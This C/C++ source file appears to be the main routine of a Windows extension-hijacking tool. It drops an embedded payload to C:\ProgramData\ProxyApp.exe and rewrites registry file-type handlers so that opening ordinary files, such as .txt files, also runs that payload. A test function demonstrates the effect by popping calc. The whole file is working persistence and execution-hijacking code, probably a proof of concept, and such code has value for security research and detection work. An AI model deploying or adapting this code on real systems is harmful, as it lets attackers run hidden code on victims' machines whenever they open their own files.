#include <windows.h>
#include <stdio.h>
#include "res_dropper.h"
#include "ext_hijacker.h"

void make_test()
{
    char test_txt[] = "test.txt";
    char test_cmd[] = "test.bat";
    FILE *f = fopen(test_txt, "w");
    if (!f) {
        return;
    }

    fprintf(f,"If you see the calc popping along with this file, it means the .txt extension got hijacked!\n" );
    fclose(f);

    f = fopen(test_cmd, "w");
    if (!f) {
        return;
    }
    fprintf(f, test_txt);
    fclose(f);
    printf("Opening test file...\n");
    WinExec(test_cmd,SW_SHOWNORMAL);
}

int main(int argc, char *argv[])
{
    char payloadName[] = "C:\\ProgramData\\ProxyApp.exe";
    if (!dropResource(payloadName)) {
        printf("[-] Dropping failed!\n");
    }
    std::set<std::string> handlersSet = getGlobalCommands();

    std::string classesKey = getLocalClasses();
    printf("%s\n", classesKey.c_str());
    size_t extCount = rewriteHandlers(classesKey, handlersSet);
    printf("[+] Rewritten handlers: %d\n", (int)extCount);
    
    size_t hijacked = hijackHandlers(payloadName);
    if (hijacked == 0) {
        printf("[-] Hijacking failed!\n");
    } else {
        printf("[+] Hijacked %ld keys\n", static_cast<unsigned long>(hijacked));
    }
    make_test();
    system("pause");
    return 0;
}

